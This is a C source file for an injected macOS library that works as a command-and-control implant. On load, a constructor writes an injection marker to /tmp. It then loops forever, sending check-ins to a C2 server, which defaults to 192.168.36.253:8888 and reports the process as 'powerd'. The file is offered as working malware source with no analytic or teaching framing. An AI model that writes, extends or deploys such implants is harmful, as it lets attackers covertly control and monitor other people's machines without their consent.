@import Darwin;
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>

#define C2_SERVER_KEY  "__C2URL__"

static char *c2_server = NULL;
static char *device_id = NULL;
static volatile int running = 1;

static void* (*_dlopen)(const char*, int);
static int (*_close)(int);
static int (*_open)(const char*, int, ...);
static int (*_write)(int, const void*, size_t);
static int (*_read)(int, void*, size_t);
static pid_t (*_getpid)(void);
static void* (*_memset)(void*, int, size_t);
static void* (*_memcpy)(void*, const void*, size_t);
static int (*_snprintf)(char*, size_t, const char*, ...);
static int (*_strcmp)(const char*, const char*);
static size_t (*_strlen)(const char*);
static void* (*_malloc)(size_t);
static void (*_free)(void*);
static char* (*_strstr)(const char*, const char*);
static char* (*_strchr)(const char*, int);
static int (*_usleep)(useconds_t);

static int http_request(const char *host, int port, const char *method,
                        const char *path, const char *body, char *resp, size_t resp_size) {
    struct sockaddr_in addr;
    struct hostent *he;
    char req[8192];
    int sock;

    _memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);

    if ((he = gethostbyname(host)) == NULL) return -1;
    _memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;

    struct timeval tv = {5, 0};
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));

    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        _close(sock);
        return -1;
    }

    size_t blen = body ? _strlen(body) : 0;
    int n = _snprintf(req, sizeof(req),
        "%s %s HTTP/1.0\r\n"
        "Host: %s\r\n"
        "Content-Type: application/json\r\n"
        "Content-Length: %zu\r\n"
        "Connection: close\r\n"
        "\r\n"
        "%s",
        method, path, host, blen, body ? body : "");

    _write(sock, req, n);

    size_t total = 0;
    int r;
    while (total < resp_size - 1 && (r = _read(sock, resp + total, resp_size - total - 1)) > 0) {
        total += r;
    }
    resp[total] = 0;
    _close(sock);
    return 0;
}

static void checkin(void) {
    if (!c2_server || !device_id) return;

    char host[256] = {0};
    int port = 8888;
    char *colon = _strchr(c2_server, ':');
    if (colon) {
        _snprintf(host, colon - c2_server + 1, "%s", c2_server);
        port = atoi(colon + 1);
    } else {
        _snprintf(host, sizeof(host), "%s", c2_server);
    }

    char body[1024];
    _snprintf(body, sizeof(body),
        "{\"id\":\"%s\",\"proc\":\"powerd\",\"pid\":%d}",
        device_id, _getpid());

    char resp[4096];
    http_request(host, port, "POST", "/api/checkin", body, resp, sizeof(resp));
}

static void* agent_main(void *arg) {
    _usleep(500000);
    checkin();

    while (running) {
        int i;
        for (i = 0; i < 10 && running; i++) {
            _usleep(1000000);
        }
        checkin();
    }
    return NULL;
}

__attribute__((constructor)) static void init(void) {
    _dlopen = dlopen;
    _close = close;
    _open = open;
    _write = write;
    _read = read;
    _getpid = getpid;
    _memset = memset;
    _memcpy = memcpy;
    _snprintf = snprintf;
    _strcmp = strcmp;
    _strlen = strlen;
    _malloc = malloc;
    _free = free;
    _strstr = strstr;
    _strchr = strchr;
    _usleep = usleep;

    c2_server = C2_SERVER_KEY;
    if (_strcmp(c2_server, "__C2" "URL__") == 0) {
        c2_server = "192.168.36.253:8888";
    }

    char idbuf[64];
    _snprintf(idbuf, sizeof(idbuf), "pwr_%d_%d", _getpid(), (int)time(NULL));
    device_id = _malloc(_strlen(idbuf) + 1);
    if (device_id) {
        _snprintf(device_id, _strlen(idbuf) + 1, "%s", idbuf);
    }

    // Marker file to confirm injection
    char marker[128];
    _snprintf(marker, sizeof(marker), "/tmp/.coruna_injected_%d", _getpid());
    int fd = _open(marker, O_CREAT | O_WRONLY | O_TRUNC, 0644);
    if (fd >= 0) {
        _write(fd, agent_main, 8);
        _close(fd);
    }

    agent_main(NULL);
}
